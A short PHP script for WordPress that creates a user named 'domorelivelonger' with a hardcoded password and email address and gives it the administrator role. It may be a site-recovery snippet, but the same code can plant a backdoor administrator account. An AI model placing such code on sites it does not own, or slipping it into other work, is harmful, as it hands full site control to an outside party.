<?php
require 'wp-load.php';
$username = 'domorelivelonger';
$password = 'ChangeME';
$email_address = 'domorelivelonger@gmail.com';
if ( ! username_exists( $username ) ) {
$user_id = wp_create_user( $username, $password, $email_address );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} ?>`
